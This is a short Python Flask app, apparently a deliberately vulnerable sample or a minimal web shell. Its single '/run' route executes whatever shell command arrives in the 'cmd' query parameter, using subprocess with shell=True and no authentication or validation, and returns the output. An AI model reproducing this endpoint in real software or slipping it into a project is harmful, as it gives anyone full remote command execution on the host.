import os
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/run')
def run_command():
    cmd = request.args.get('cmd')
    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    return result.stdout.read()
